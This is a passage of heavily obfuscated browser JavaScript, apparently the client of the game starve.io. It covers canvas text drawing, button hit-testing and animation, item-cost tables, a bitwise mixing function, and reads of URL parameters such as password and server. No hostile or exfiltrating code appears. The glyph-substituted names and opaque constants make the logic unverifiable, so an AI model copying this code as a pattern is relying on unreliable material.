		function ᐃⲆⲆⲆⲆ(text, ⵠΔⲆⵠⵠ, Ⲇᐃ, ΔΔⲆ, ⵠⲆⵠ, ᐃΔΔΔᐃⵠᐃ, ΔΔⵠⵠⵠᐃΔ, ⵠⲆᐃΔᐃᐃⵠ, ᐃᐃᐃᐃΔ, ⵠⵠΔΔⵠΔⲆⵠᐃ, ᐃⲆⵠΔⲆ, ᐃᐃⲆⲆⲆ, ⲆᐃΔⵠⵠΔⲆ, ⲆᐃᐃⲆΔΔΔ, ΔΔΔᐃᐃΔⲆ) {
			if (0 === text.length) text = " ";
			ΔΔⵠⵠⵠᐃΔ === undefined && (ΔΔⵠⵠⵠᐃΔ = ᐃⵠΔ);
			undefined === ⵠⲆᐃΔᐃᐃⵠ && (ⵠⲆᐃΔᐃᐃⵠ = 0);
			if (undefined === ᐃᐃᐃᐃΔ) ᐃᐃᐃᐃΔ = ΔΔⵠ;
			if (ᐃᐃⵠᐃᐃ === ⲆᐃᐃⲆΔΔΔ) ⲆᐃᐃⲆΔΔΔ = 0;
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Δ.textBaseline = ⵠ[3], Δ.font = (undefined !== ΔΔΔᐃᐃΔⲆ ? ΔΔΔᐃᐃΔⲆ + " " : "") + ΔΔⲆ + "px " + ⵠΔⲆⵠⵠ;
			undefined !== ⵠⲆⵠ ? ⵠⲆⵠ = Math.min(Δ.measureText(text).width, ⵠⲆⵠ) : ⵠⲆⵠ = Δ.measureText(text).width;
			Ⲇⵠ.width = ⵠⲆⵠ + ΔΔⵠⵠⵠᐃΔ;
			Ⲇⵠ.height = ΔΔⲆ + ⵠⲆᐃΔᐃᐃⵠ;
			if (ⲆΔⵠⲆⵠ !== ᐃΔΔΔᐃⵠᐃ) {
				if (undefined !== ᐃⲆⵠΔⲆ) Δ.globalAlpha = ᐃⲆⵠΔⲆ;
				Δ.fillStyle = ᐃΔΔΔᐃⵠᐃ;
				if (ᐃᐃⲆⲆⲆ !== ⲆΔΔΔⲆ) {
					ⵠᐃᐃᐃΔᐃΔⵠⵠ(Δ, ᐃᐃᐃᐃΔ + ⲆᐃᐃⲆ, ᐃᐃᐃᐃΔ, ⵠⲆⵠ + ΔΔⵠⵠⵠᐃΔ - ⵠΔᐃᐃⵠ * ᐃᐃᐃᐃΔ - 4, ΔΔⲆ + ⵠⲆᐃΔᐃᐃⵠ - ᐃⲆⵠᐃΔ * ᐃᐃᐃᐃΔ, ᐃᐃⲆⲆⲆ);
					Δ.fill()
				} else Δ.fillRect(ᐃᐃᐃᐃΔ, ᐃᐃᐃᐃΔ, ⵠⲆⵠ + ΔΔⵠⵠⵠᐃΔ - ᐃᐃᐃᐃΔ * ΔⵠᐃⲆ, ΔΔⲆ + ⵠⲆᐃΔᐃᐃⵠ - ᐃⲆⵠᐃ * ᐃᐃᐃᐃΔ);
				Δ.globalAlpha = 1;
				ⵠᐃⲆᐃ !== ᐃᐃᐃᐃΔ && (Δ.lineWidth = ᐃᐃᐃᐃΔ, Δ.strokeStyle = ⵠⵠΔΔⵠΔⲆⵠᐃ, Δ.stroke())
			}
			Δ.textBaseline = ⵠ[ⵠᐃⵠⲆ];
			Δ.font = (ΔΔΔᐃᐃΔⲆ !== ΔΔΔⲆΔ ? ΔΔΔᐃᐃΔⲆ + " " : "") + ΔΔⲆ + "px " + ⵠΔⲆⵠⵠ;
			ⲆⲆⲆⲆᐃ !== ⲆᐃΔⵠⵠΔⲆ && (Δ.strokeStyle = ⲆᐃΔⵠⵠΔⲆ, Δ.lineWidth = ⲆᐃᐃⲆΔΔΔ, Δ.lineJoin = "miter", Δ.miterLimit = ᐃⲆΔⲆ, Δ.strokeText(text, Math.floor(ΔΔⵠⵠⵠᐃΔ / ⵠⵠΔⲆ), Math.floor(ⵠⲆᐃΔᐃᐃⵠ / ⲆΔΔⵠ) + Math.floor(ΔΔⲆ / 2), ⵠⲆⵠ));
			Δ.fillStyle = Ⲇᐃ;
			Δ.fillText(text, Math.floor(ΔΔⵠⵠⵠᐃΔ / ⲆⵠΔΔ), Math.floor(ⵠⲆᐃΔᐃᐃⵠ / ⵠⵠΔⲆ) + Math.floor(ΔΔⲆ / 2), ⵠⲆⵠ);
			Ⲇⵠ.w2 = Ⲇⵠ.width / Ⲇⵠⵠᐃ;
			Ⲇⵠ.ΔΔⵠⲆᐃ = Ⲇⵠ.height / 2;
			return Ⲇⵠ
		}

		function Δⵠⵠ(ⵠⲆⵠ, ΔΔⲆ, text, ⲆⲆⲆⵠⵠⲆⵠ, ᐃΔΔᐃⵠⲆΔ, ᐃΔⲆⲆ, callback, Δⵠ, ⲆⵠⲆ, ⲆᐃⲆⵠᐃ, ΔⲆⲆΔⲆ) {
			ⲆΔⵠⲆⲆ === ⲆⵠⲆ && (ⲆⵠⲆ = Δⵠᐃ);
			ᐃⲆᐃⲆⲆ === Δⵠ && (Δⵠ = 0);
			if (undefined === ⲆᐃⲆⵠᐃ) ⲆᐃⲆⵠᐃ = ᐃⵠⲆⵠ;
			ΔⲆⲆΔⲆ === ᐃᐃⵠᐃᐃ && (ΔⲆⲆΔⲆ = ΔΔΔ);
			ᐃΔΔᐃⵠⲆΔ = ⵠᐃⵠⲆ === ᐃΔΔᐃⵠⲆΔ ? ΔΔⵠΔ : ᐃΔΔᐃⵠⲆΔ === ΔΔᐃⵠ ? ⵠⵠΔⲆ : 1;
			ᐃΔⲆⲆ !== ᐃΔᐃⲆ && (ᐃΔⲆⲆ = Ⲇᐃᐃᐃ);
			if (ⲆⲆⲆⵠⵠⲆⵠ) var ᐃⵠ = ⲆⲆⲆⵠⵠⲆⵠ;
			var ⵠⵠⲆΔ = {
				width: ⵠⲆⵠ,
				height: ΔΔⲆ,
				"ᐃⵠ": ᐃⵠ,
				state: ⵠⲆⲆΔᐃΔΔ,
				translate: {
					x: Δⵠ,
					y: ⲆⵠⲆ,
					"ᐃΔⵠᐃᐃ": Δⵠ,
					"ᐃᐃΔⵠⵠ": ⲆⵠⲆ
				},
				"ⲆΔᐃᐃΔᐃⵠⵠⵠ": ᐃΔⲆⲆ,
				"ᐃΔⲆⲆ": ᐃⵠⲆ,
				callback: callback,
				position: ⲆᐃⲆⵠᐃ,
				active: ΔⲆⲆΔⲆ
			};
			var ᐃΔΔⲆᐃΔⲆ = function() {
				return ⵠⵠⲆΔ.ᐃⵠ[ⵠⵠⲆΔ.state]
			};
			var ⵠᐃⲆᐃⵠΔΔ = function(ⲆⲆⵠⵠ) {
				var Δᐃ = ⵠⵠⲆΔ.translate;
				if (ΔᐃΔΔ === ⵠⵠⲆΔ.width || 0 === ⵠⵠⲆΔ.height) {
					ⵠⵠⲆΔ.width = ⵠⵠⲆΔ.ᐃⵠ[0].width;
					ⵠⵠⲆΔ.height = ⵠⵠⲆΔ.ᐃⵠ[0].height
				}
				return ⲆⲆⵠⵠ.x > Δᐃ.x && ⲆⲆⵠⵠ.x < Δᐃ.x + ⵠⵠⲆΔ.width / ᐃΔΔᐃⵠⲆΔ && ⲆⲆⵠⵠ.y > Δᐃ.y && ⲆⲆⵠⵠ.y < Δᐃ.y + ⵠⵠⲆΔ.height / ᐃΔΔᐃⵠⲆΔ
			};
			var ⵠΔⵠⲆ = function(Ⲇⵠ, ⲆⲆⵠⵠ, ΔⵠΔⲆ) {
				if (ⵠᐃⲆᐃⵠΔΔ(ⲆⲆⵠⵠ)) {
					if (ⵠⲆⵠⵠⵠ == ΔⵠΔⲆ) ⵠⵠⲆΔ.state = ᐃΔⵠⵠ;
					else if (ᐃᐃⵠΔⲆ == ΔⵠΔⲆ) ⵠⵠⲆΔ.state = ΔᐃⵠⵠᐃⲆⲆ;
					else if (ΔⵠΔⲆ == ΔᐃᐃΔⲆ && ᐃΔⵠⵠ != ⵠⵠⲆΔ.state) ⵠⵠⲆΔ.state = ΔᐃⵠⵠᐃⲆⲆ;
					return true
				}
				ⵠⵠⲆΔ.state = ⵠⲆⲆΔᐃΔΔ;
				return false
			};
			var ᐃΔⲆⲆ = function() {
				var ᐃⵠⲆΔ = 0;
				if (ⵠⵠⲆΔ.ⲆΔᐃᐃΔᐃⵠⵠⵠ === ΔᐃⲆⵠ) {
					if (ⵠⵠⲆΔ.state === ΔᐃⵠⵠᐃⲆⲆ || ᐃΔⵠⵠ === ⵠⵠⲆΔ.state) ⵠⵠⲆΔ.ᐃΔⲆⲆ = (ⵠⵠⲆΔ.ᐃΔⲆⲆ + 1e3 * ᐃⵠᐃᐃ) % 1e3;
					else if (Ⲇᐃⵠⵠ < ⵠⵠⲆΔ.ᐃΔⲆⲆ) {
						ⵠⵠⲆΔ.ᐃΔⲆⲆ = ⵠⵠⲆΔ.ᐃΔⲆⲆ > 500 ? ⵠⵠⲆΔ.ᐃΔⲆⲆ + 1e3 * ᐃⵠᐃᐃ : ⵠⵠⲆΔ.ᐃΔⲆⲆ - 1e3 * ᐃⵠᐃᐃ;
						if (Δⵠᐃ > ⵠⵠⲆΔ.ᐃΔⲆⲆ || ⵠⵠⲆΔ.ᐃΔⲆⲆ > 1e3) ⵠⵠⲆΔ.ᐃΔⲆⲆ = ⵠⲆⲆ
					}
					ᐃⵠⲆΔ = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ⵠⵠⲆΔ.ᐃΔⲆⲆ > 500 ? (1e3 - ⵠⵠⲆΔ.ᐃΔⲆⲆ) / 500 : ⵠⵠⲆΔ.ᐃΔⲆⲆ / 500) * .2
				}
				return ᐃⵠⲆΔ
			};
			var ΔᐃΔⵠ;
			if (2 === ᐃΔΔᐃⵠⲆΔ) {
				ΔᐃΔⵠ = function(ΔⵠΔᐃΔ) {
					var ᐃⵠⲆΔ = 1 + ᐃΔⲆⲆ();
					var ᐃⵠ = ᐃΔΔⲆᐃΔⲆ();
					var ᐃⵠⵠ = ᐃⵠⲆΔ * ⵠⵠⲆΔ.width / 2;
					var ⵠⵠᐃ = ⵠⵠⲆΔ.height * ᐃⵠⲆΔ / 2;
					var ΔΔⵠΔᐃᐃᐃ = (ᐃⵠⵠ - ⵠⵠⲆΔ.width / 2) / ΔⵠᐃⲆ;
					var ⲆⵠⵠΔⲆ = (ⵠⵠᐃ - ⵠⵠⲆΔ.height / ⲆᐃᐃⲆ) / ⲆⲆΔᐃ;
					ΔⲆΔⵠ(ΔⵠΔᐃΔ, ᐃⵠ, ⵠⵠⲆΔ.translate.x - ΔΔⵠΔᐃᐃᐃ, ⵠⵠⲆΔ.translate.y - ⲆⵠⵠΔⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
				}
			} else if (ᐃΔΔᐃⵠⲆΔ === 3) {
				ΔᐃΔⵠ = function(ΔⵠΔᐃΔ) {
					var ᐃⵠ = ᐃΔΔⲆᐃΔⲆ();
					var ᐃⵠⵠ = ⵠⵠⲆΔ.width;
					var ⵠⵠᐃ = ⵠⵠⲆΔ.height;
					var ΔΔⵠΔᐃᐃᐃ = (ᐃⵠⵠ - ⵠⵠⲆΔ.width) / ⲆᐃᐃⲆ;
					var ⲆⵠⵠΔⲆ = (ⵠⵠᐃ - ⵠⵠⲆΔ.height) / Ⲇᐃᐃⵠ;
					ΔⲆΔⵠ(ΔⵠΔᐃΔ, ᐃⵠ, ⵠⵠⲆΔ.translate.x - ΔΔⵠΔᐃᐃᐃ, ⵠⵠⲆΔ.translate.y - ⲆⵠⵠΔⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
				};
				ᐃΔΔᐃⵠⲆΔ = ᐃΔᐃⲆ
			} else {
				ΔᐃΔⵠ = function(ΔⵠΔᐃΔ) {
					var ᐃⵠ = ᐃΔΔⲆᐃΔⲆ();
					ΔⲆΔⵠ(ΔⵠΔᐃΔ, ᐃⵠ, ⵠⵠⲆΔ.translate.x, ⵠⵠⲆΔ.translate.y)
				}
			}
			return {
				info: ⵠⵠⲆΔ,
				"ⵠΔⵠⲆ": ⵠΔⵠⲆ,
				"ΔᐃΔⵠ": ΔᐃΔⵠ,
				"ⵠᐃⲆᐃⵠΔΔ": ⵠᐃⲆᐃⵠΔΔ
			}
		}

		function ΔⵠΔᐃⲆⵠⲆ(ⲆΔⵠⵠⵠⵠⲆ, ᐃⵠⵠⵠⵠΔᐃ, ᐃᐃΔⲆⲆⲆⵠ, ᐃΔᐃᐃⲆΔⲆ, ⲆⵠᐃᐃᐃⵠΔ) {
			const ᐃⲆᐃᐃⲆᐃⲆ = 54376 ^ ⲆΔⵠⵠⵠⵠⲆ;
			const ᐃⲆⵠⵠⵠⲆⵠ = (2147483587 + 2147483629 * (ᐃⵠⵠⵠⵠΔᐃ + 32576)) % 2147483647;
			const ᐃΔΔⵠⵠᐃΔⵠⲆ = (16 << (ᐃᐃΔⲆⲆⲆⵠ >> 8 & ⲆⵠⵠⵠⲆⲆⲆ)) + (8 << (ᐃᐃΔⲆⲆⲆⵠ >> 24 & 255)) + (24 << (ᐃᐃΔⲆⲆⲆⵠ >> ᐃⵠⲆⲆᐃⵠⵠ & 255)) + (0 << (ᐃᐃΔⲆⲆⲆⵠ >> 0 & 255));
			const ᐃⲆⵠᐃᐃΔⲆⲆⵠ = (ᐃΔᐃᐃⲆΔⲆ | 47375) & ~(ᐃΔᐃᐃⲆΔⲆ & 47375);
			const ⵠⵠⲆΔΔᐃⲆΔΔ = ((ⲆⵠᐃᐃᐃⵠΔ + 23843) * 214013 + 2531011) % 4294967296;
			const ⵠⵠⲆⲆⵠΔⵠ = ᐃⵠΔΔⵠᐃΔ(ᐃⲆᐃᐃⲆᐃⲆ, ᐃⲆⵠⵠⵠⲆⵠ, ᐃΔΔⵠⵠᐃΔⵠⲆ);
			const ⵠⲆⲆⵠᐃⲆᐃᐃᐃ = ᐃΔᐃⵠⲆⵠᐃ(ᐃⲆⵠᐃᐃΔⲆⲆⵠ, ⵠⵠⲆΔΔᐃⲆΔΔ, ᐃⲆᐃᐃⲆᐃⲆ, ᐃⲆⵠⵠⵠⲆⵠ);
			const ⲆΔᐃⵠΔᐃⲆΔⵠ = ~(ⵠⵠⲆⲆⵠΔⵠ & 48831) & 48831 | ~(48831 & ⵠⵠⲆⲆⵠΔⵠ) & ⵠⵠⲆⲆⵠΔⵠ;
			return ⲆΔᐃⵠΔᐃⲆΔⵠ
		}

		function ⵠⲆΔΔⲆⵠΔΔⲆ(ᐃⵠ, Δᐃᐃ) {
			undefined === Δᐃᐃ && (Δᐃᐃ = .033);
			var Δᐃ = {
				y: 0,
				x: ᐃⵠΔ
			};
			var ⵠⲆ = 0;
			var ΔⲆΔⲆΔ = 0;
			var ᐃΔΔⲆᐃΔⲆ = function() {
				ΔⲆΔⲆΔ += ᐃⵠᐃᐃ;
				if (ΔⲆΔⲆΔ > Δᐃᐃ) {
					ⵠⲆ = (ⵠⲆ + 1) % ᐃⵠ.length;
					ΔⲆΔⲆΔ -= Δᐃᐃ
				}
				return ᐃⵠ[ⵠⲆ]
			};
			var ΔᐃΔⵠ = function(ΔⵠΔᐃΔ) {
				ΔⲆΔⵠ(ΔⵠΔᐃΔ, ᐃΔΔⲆᐃΔⲆ(), Δᐃ.x, Δᐃ.y)
			};
			return {
				"ᐃⵠ": ᐃⵠ,
				translate: Δᐃ,
				"ΔᐃΔⵠ": ΔᐃΔⵠ
			}
		}
		var ᐃⵠΔΔ = ⵠ[499];
		var ΔⵠᐃΔΔΔᐃ = ΔΔⲆᐃ.ⲆⲆᐃᐃⵠΔⲆ(ⵠ[552]) === "1" ? ⵠΔΔ : ΔᐃΔΔ;
		var ⲆΔⵠⲆΔⲆⲆΔΔ = ΔΔⲆᐃ.ⲆⲆᐃᐃⵠΔⲆ("password");
		var ΔΔⵠΔᐃ = ΔΔⲆᐃ.ⲆⲆᐃᐃⵠΔⲆ("debug") || ⲆⲆⲆⲆᐃ;
		if (ΔΔⵠΔᐃ !== undefined) ΔΔⵠΔᐃ = JSON.parse(ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[104]](ΔΔⵠΔᐃ));
		var ΔⲆΔΔⲆⲆᐃ = ΔΔⲆᐃ.ⲆⲆᐃᐃⵠΔⲆ("server") || undefined;
		var ⲆⵠⲆᐃⲆΔⵠ = ΔΔⲆᐃ.ⲆⲆᐃᐃⵠΔⲆ("region") || ⲆΔΔΔⲆ;
		var ΔΔⲆⲆΔᐃΔ = "starve.io";
		var ᐃΔⵠⵠⵠᐃΔ = "https://" + ΔΔⲆⲆΔᐃΔ;
		var ⵠⵠⵠⲆ = {
			"ᐃⵠⵠᐃⵠⵠⵠ": 16,
			"ⵠΔΔⲆⲆΔⵠ": 256,
			"ⲆΔΔⵠⵠΔΔⲆᐃ": 1,
			"ⵠΔΔΔ": 2,
			IDLE: 64,
			"ⵠⵠⲆΔⵠⲆⲆ": 32,
			"ΔⲆᐃⲆᐃ": 4,
			"ⵠΔΔᐃᐃⲆⵠ": ⵠⲆⲆΔΔ,
			"ⲆⲆᐃᐃⵠⵠΔ": 128
		};
		var ⲆᐃⵠⲆⵠᐃⲆ = [{
			"Δᐃᐃⵠⵠ": 1e3,
			items: [
				[2, ᐃᐃ.ⵠⲆΔᐃΔ],
				[1, ᐃᐃ.ⲆᐃⲆⲆⲆ],
				[8, ᐃᐃ.ⵠⲆΔⲆⲆ],
				[1, ᐃᐃ.ⲆΔⵠΔⲆ]
			]
		}, {
			"Δᐃᐃⵠⵠ": 2e3,
			items: [
				[ⵠⵠΔⲆ, ᐃᐃ.ⲆⵠⵠⵠⲆ],
				[ΔⲆⵠ, ᐃᐃ.ΔᐃⲆΔⲆ],
				[2, ᐃᐃ.ⲆᐃⲆⲆⲆ],
				[16, ᐃᐃ.ⵠⲆΔⲆⲆ],
				[ⲆᐃᐃⲆ, ᐃᐃ.ⲆΔⵠΔⲆ]
			]
		}, {
			"Δᐃᐃⵠⵠ": 4e3,
			items: [
				[Δⵠᐃⵠ, ᐃᐃ.ⲆⵠⵠⵠⲆ],
				[ⵠⲆΔ, ᐃᐃ.ⲆⵠᐃⵠΔ],
				[4, ᐃᐃ.ⲆᐃⲆⲆⲆ],
				[ⵠΔΔⲆᐃ, ᐃᐃ.ⵠⲆΔⲆⲆ],
				[4, ᐃᐃ.ⲆΔⵠΔⲆ],
				[1, ᐃᐃ.ᐃⲆⲆΔᐃ],
				[80, ᐃᐃ.ᐃᐃΔⲆ],
				[140, ᐃᐃ.ⵠⲆⲆᐃ]
			]
		}, {
			"Δᐃᐃⵠⵠ": 8e3,
			items: [
				[ⵠⲆΔ, ᐃᐃ.ⵠᐃᐃⵠ],
				[4, ᐃᐃ.ⲆⵠⵠⵠⲆ],
				[1, ᐃᐃ.ΔΔⲆⵠⲆ],
				[ᐃⵠΔⵠⲆⲆⲆ, ᐃᐃ.ⲆᐃⲆⲆⲆ],
				[30, ᐃᐃ.ⵠⲆΔⲆⲆ],
				[6, ᐃᐃ.ⲆΔⵠΔⲆ],
				[1, ᐃᐃ.ᐃⲆⲆΔᐃ],
				[150, ᐃᐃ.ᐃᐃΔⲆ],
				[200, ᐃᐃ.ⵠⲆⲆᐃ],
				[60, ᐃᐃ.ΔⲆⵠⵠ],
				[ⲆⲆΔᐃ, ᐃᐃ.ⵠⲆᐃᐃᐃ]
			]
		}, {
			"Δᐃᐃⵠⵠ": 16e3,
			items: [
				[ⵠᐃⵠΔ, ᐃᐃ.ⵠᐃᐃⵠ],
				[1, ᐃᐃ.ⵠⲆⲆΔⲆ],
				[1, ᐃᐃ.ⲆⲆⲆⲆΔ],
				[7, ᐃᐃ.ⲆΔΔⲆᐃ],
				[2, ᐃᐃ.ⵠⲆᐃᐃᐃ],
				[2, ᐃᐃ.ⲆⵠⵠⵠⲆ],
				[1, ᐃᐃ.ⵠΔⵠΔᐃ],
				[15, ᐃᐃ.ΔⵠΔⲆⲆ],
				[2, ᐃᐃ.ⲆΔⵠΔΔ],
				[ⵠΔᐃ, ᐃᐃ.ⲆΔᐃⲆᐃ],
				[1, ᐃᐃ.ΔΔᐃⲆΔ],
				[200, ᐃᐃ.ᐃᐃΔⲆ],
				[300, ᐃᐃ.ⵠⲆⲆᐃ]
			]
		}, {
			"Δᐃᐃⵠⵠ": 16e3,
			items: [
				[1, ᐃᐃ.ⵠᐃᐃⵠ],
				[ⵠΔⲆ, ᐃᐃ.ᐃᐃⲆⵠᐃ],
				[ⵠᐃⵠΔ, ᐃᐃ.ΔΔⲆⵠΔ],
				[1, ᐃᐃ.ΔΔⲆⵠⲆ],
				[ⲆΔΔᐃᐃ, ᐃᐃ.ⲆΔΔⲆᐃ],
				[4, ᐃᐃ.ⵠⲆᐃᐃᐃ],
				[6, ᐃᐃ.ⲆⵠⵠⵠⲆ],
				[ᐃⲆᐃᐃ, ᐃᐃ.ΔΔⵠⵠᐃ],
				[1, ᐃᐃ.ⵠⵠⲆⵠⲆ],
				[200, ᐃᐃ.ᐃᐃΔⲆ],
				[300, ᐃᐃ.ⵠⲆⲆᐃ]
			]
		}, {
			"Δᐃᐃⵠⵠ": 16e3,
			items: [
				[1, ᐃᐃ.ⵠᐃᐃⵠ],
				[1, ᐃᐃ.ⲆⵠᐃΔΔ],
				[ⵠΔⲆ, ᐃᐃ.ⲆᐃⵠΔⲆ],
				[3, ᐃᐃ.ΔΔⵠⵠᐃ],
				[ΔⵠⲆΔ, ⵠᐃⲆᐃ],
				[ⵠᐃⵠΔ, ᐃᐃ.ΔΔⲆⵠⲆ],
				[7, ᐃᐃ.ⲆΔΔⲆᐃ],
				[ΔⵠⵠΔ, ᐃᐃ.ⵠⲆᐃᐃᐃ],
				[4, ᐃᐃ.ⲆⵠⵠⵠⲆ],
				[150, ᐃᐃ.ᐃᐃΔⲆ],
				[200, ᐃᐃ.ⵠⲆⲆᐃ],
				[1, ᐃᐃ.ΔⵠΔⵠΔ]
			]
		}, {
			"Δᐃᐃⵠⵠ": 16e3,
			items: [
				[1, ᐃᐃ.ⵠᐃᐃⵠ],
				[ᐃᐃⲆΔ, ᐃᐃ.ⲆⲆΔⲆᐃ],
				[1, ᐃᐃ.ΔΔⲆⵠⲆ],
				[ⵠᐃⲆᐃΔⲆⵠ, ᐃᐃ.ⲆΔΔⲆᐃ],
				[2, ᐃᐃ.ⵠⲆᐃᐃᐃ],
				[ⵠᐃᐃⲆ, ᐃᐃ.ⲆⵠⵠⵠⲆ],
				[Ⲇᐃᐃⵠ, ᐃᐃ.ΔΔⲆᐃᐃ],
				[4, ᐃᐃ.ⲆⵠᐃⲆⵠ],
				[10, ᐃᐃ.ⵠᐃΔⲆⲆ],
				[6, ᐃᐃ.ⲆⵠⲆΔⲆ],
				[4, ᐃᐃ.ⵠΔⵠᐃΔ],
				[1, ᐃᐃ.ⵠⲆⲆⵠⵠ],
				[500, ᐃᐃ.ⵠⲆⲆᐃ]
			]
		}, {
			"Δᐃᐃⵠⵠ": 16e3,
			items: [
				[1, ᐃᐃ.ⵠᐃᐃⵠ],
				[1, ᐃᐃ.ΔΔⲆⵠⲆ],
				[16, ᐃᐃ.Ⲇⵠᐃᐃⵠ],
				[ᐃᐃⲆΔ, ᐃᐃ.ⵠⲆᐃᐃᐃ],
				[ⲆΔᐃⵠⵠᐃⵠ, ᐃᐃ.ⲆⵠⵠⵠⲆ],
				[3, ᐃᐃ.ΔΔⵠⵠᐃ],
				[1, ᐃᐃ.ᐃⲆΔΔⵠ],
				[ⵠᐃⵠΔ, ᐃᐃ.ⲆᐃⵠΔᐃ],
				[ⵠⵠΔΔᐃⵠⲆ, ᐃᐃ.ΔⲆΔⲆᐃ],
				[150, ᐃᐃ.ᐃᐃΔⲆ],
				[200, ᐃᐃ.ⵠⲆⲆᐃ]
			]
		}, {
			"Δᐃᐃⵠⵠ": 2e4,
			items: [
				[ᐃΔᐃⲆ, ᐃᐃ.ⵠᐃᐃⵠ],
				[1, ᐃᐃ.ΔΔⲆⵠⲆ],
				[ⵠΔΔ, ᐃᐃ.ⲆΔΔⲆᐃ],
				[ⵠᐃⵠΔ, ᐃᐃ.ⵠⲆᐃᐃᐃ],
				[3, ᐃᐃ.ⲆⵠⵠⵠⲆ],
				[3, ᐃᐃ.ΔΔⵠⵠᐃ],
				[ⵠΔᐃ, ᐃᐃ.ⲆⵠⲆⵠΔ],
				[1, ᐃᐃ.ⵠᐃⲆⵠΔ],
				[1, ᐃᐃ.ΔᐃΔΔΔ],
				[Ⲇᐃᐃⵠ, ᐃᐃ.ⲆΔⲆⵠΔ],
				[50, ᐃᐃ.ᐃᐃΔⲆ],
				[100, ᐃᐃ.ⵠⲆⲆᐃ]
			]
		}];
		const ᐃⲆΔΔᐃⵠⵠ = [];
		let ⵠⵠΔᐃΔᐃΔ = 0;

		function ᐃΔⲆⲆΔⲆⲆΔΔ(ΔΔⲆᐃΔ, ᐃⵠⵠΔⲆⲆᐃᐃΔ, ⲆⲆⲆⵠΔᐃᐃ) {
			const ᐃⲆⵠⵠᐃⵠⲆ = new Uint8Array(ΔΔⲆᐃΔ);
			const ΔⲆΔᐃⲆ = ᐃⲆⵠⵠᐃⵠⲆ.length;
			let ⲆⵠⲆⲆᐃⵠⵠ = ᐃⲆΔΔᐃⵠⵠ[ΔⲆΔᐃⲆ];
			let ⲆᐃΔⵠⲆ = ⲆΔΔΔⲆ;
			let ⲆⲆⵠΔⵠⲆΔ = ⵠⵠⵠⲆⵠ;
			if (undefined === ⲆⵠⲆⲆᐃⵠⵠ) {
				ⵠⵠΔᐃΔᐃΔ += 2 * ΔⲆΔᐃⲆ;
				if (65535 > ⵠⵠΔᐃΔᐃΔ) {
					ⲆᐃΔⵠⲆ = ⵠᐃⵠⵠⵠⵠⲆ(ⲆⲆⲆᐃᐃΔⵠ(ΔⲆΔᐃⲆ))
				} else {
					ⵠⵠΔᐃΔᐃΔ = ΔⲆΔᐃⲆ;
					for (let ⵠᐃ = 0; ⵠᐃ < ᐃⲆΔΔᐃⵠⵠ.length; ⵠᐃ++) {
						if (ᐃⲆΔΔᐃⵠⵠ[ⵠᐃ] !== ⲆᐃΔⲆᐃ) {
							const ⲆᐃΔⵠⲆ = ᐃⲆΔΔᐃⵠⵠ[ⵠᐃ][0];
							ᐃⲆΔΔᐃⵠⵠ[ⵠᐃ] = undefined;
							ᐃⲆⵠΔⲆᐃΔ(ⲆᐃΔⵠⲆ)
						}
					}
					ⲆᐃΔⵠⲆ = ⵠᐃⵠⵠⵠⵠⲆ(ⲆⲆⲆᐃᐃΔⵠ(ΔⲆΔᐃⲆ));
					ⲆᐃⲆᐃⵠΔᐃ()
				}
				ⲆⲆⵠΔⵠⲆΔ = ⲆᐃⲆⵠⵠⵠⲆ(ⲆᐃΔⵠⲆ);
				ᐃⲆΔΔᐃⵠⵠ[ΔⲆΔᐃⲆ] = [ⲆᐃΔⵠⲆ, ⲆⲆⵠΔⵠⲆΔ]
			} else {
				ⲆᐃΔⵠⲆ = ⲆⵠⲆⲆᐃⵠⵠ[ΔⲆⲆ];
				ⲆⲆⵠΔⵠⲆΔ = ⲆⵠⲆⲆᐃⵠⵠ[ΔᐃⲆⵠ]
			}
			for (let ⵠᐃ = 0; ᐃⲆⵠⵠᐃⵠⲆ.length > ⵠᐃ; ⵠᐃ++) ⲆⲆⵠΔⵠⲆΔ[ⵠᐃ] = ᐃⲆⵠⵠᐃⵠⲆ[ⵠᐃ];
			ⲆᐃᐃΔⲆⵠⵠ(ⲆᐃΔⵠⲆ, ᐃⵠⵠΔⲆⲆᐃᐃΔ, ⲆⲆⲆⵠΔᐃᐃ);
			for (let ⵠᐃ = ΔΔⵠⵠ; ᐃⲆⵠⵠᐃⵠⲆ.length > ⵠᐃ; ⵠᐃ++) ᐃⲆⵠⵠᐃⵠⲆ[ⵠᐃ] = ⲆⲆⵠΔⵠⲆΔ[ⵠᐃ];
			return ᐃⲆⵠⵠᐃⵠⲆ
		}
		var ᐃⲆⵠᐃᐃ = {
			"ᐃΔᐃᐃⲆᐃⵠⲆᐃ": 8e3,
			"ⵠΔⵠᐃᐃᐃΔⵠΔ": ⲆⲆⲆⵠΔ,
			"ⵠᐃⲆⵠⲆⵠΔ": 3,
			"ⲆⵠⵠᐃⵠⲆΔ": 4,
			"ᐃⲆⵠⲆΔΔⵠⵠᐃ": ΔΔᐃⲆ,
			"ⲆⵠⲆⲆᐃΔⲆ": 1,
			"ΔⲆᐃᐃⲆⲆᐃⵠⵠ": .58,
			"ⵠΔⲆⲆΔⵠᐃ": 52,
			"ΔⵠΔΔⵠΔⲆⲆⵠ": 2e3,
			"ΔΔⲆⲆⲆΔΔ": .2,
			"ᐃᐃⲆⵠᐃᐃⲆⲆᐃ": Δⵠᐃⵠ,
			"ᐃⲆⲆⲆⵠΔΔ": 6e5,
			"ⵠᐃⲆⲆᐃⵠⵠ": Ⲇⵠⵠᐃ,
			"ⲆΔΔⵠⵠⵠⲆ": ⵠⵠΔᐃΔ,
			"ᐃⵠⵠᐃⵠⵠⵠ": .2,
			"ᐃΔᐃᐃΔⵠΔⵠᐃ": ⵠⵠΔΔ,
			"ⲆᐃᐃⵠᐃⲆᐃΔΔ": 50,
			"ⲆΔΔⵠᐃⲆΔ": ⵠⲆⲆ,
			"ⲆⲆΔⵠⲆⵠⲆⵠᐃ": 200,
			"ⲆⵠⲆⲆᐃᐃΔᐃΔ": 6e4,
			"ᐃⲆⲆⲆΔⵠⵠⵠΔ": 5,
			"ᐃΔΔⲆᐃΔⵠᐃⵠ": "[" + 21 + "]",
			"ΔⲆⲆΔᐃΔᐃⵠⲆ": 125e3,
			"ᐃⵠᐃⲆᐃⵠᐃᐃⵠ": ΔⵠⵠⲆⵠ,
			"ΔΔⲆⲆΔⵠᐃᐃᐃ": ⲆΔᐃΔⲆΔΔ
		};

